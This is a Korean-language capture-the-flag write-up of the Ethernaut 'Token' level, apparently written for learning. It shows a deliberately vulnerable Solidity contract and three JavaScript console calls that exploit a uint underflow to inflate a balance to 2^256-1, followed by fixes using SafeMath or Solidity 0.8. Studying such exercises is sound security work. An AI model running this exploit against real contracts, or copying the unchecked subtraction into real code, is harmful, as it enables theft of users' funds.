# Ethernaut Level 5 - Token

## 문제 설명

20개의 토큰을 보유한 상태에서 시작하며, 추가 토큰을 획득하면 클리어된다.
정수 언더플로우(underflow) 취약점을 이용한다.

---

## 컨트랙트 분석

```solidity
contract Token {
    mapping(address => uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}
```

---

## 취약점 분석

### 1. uint 언더플로우

```solidity
require(balances[msg.sender] - _value >= 0);
```

`uint`는 **부호 없는 정수**이므로 항상 `>= 0`이다.

- `balances[msg.sender]` = 20
- `_value` = 21
- `20 - 21` = **언더플로우 발생** → `2^256 - 1` (엄청난 양수)

조건 통과 → 잔액이 천문학적으로 증가

---

### 2. Solidity 0.8.0 이전 버전

`pragma solidity ^0.6.0` 등 **0.8.0 이전 버전**에서는 오버/언더플로우 체크가 없다.

---

## 공격 전략

21개 이상의 토큰을 임의 주소로 전송 → 언더플로우 발생 → 잔액 폭발적 증가

---

## 공격 단계

### Step 1 — 현재 잔액 확인

```js
await contract.balanceOf(player)
// → 20
```

### Step 2 — 언더플로우 유발

```js
await contract.transfer("0x0000000000000000000000000000000000000000", 21)
```

임의의 주소(0 주소)로 21개 전송

### Step 3 — 확인

```js
await contract.balanceOf(player)
// → 115792089237316195423570985008687907853269984665640564039457584007913129639935
// (2^256 - 1)
```

---

## 핵심 교훈

```solidity
// ❌ 위험 (0.8.0 이전)
balances[msg.sender] -= _value;

// ✅ 안전 방법 1 - SafeMath 사용 (0.8.0 이전)
using SafeMath for uint256;
balances[msg.sender] = balances[msg.sender].sub(_value);

// ✅ 안전 방법 2 - Solidity 0.8.0 이상 사용
// 오버/언더플로우 자동 체크
```

Solidity 0.8.0부터는 오버/언더플로우가 자동으로 revert된다.
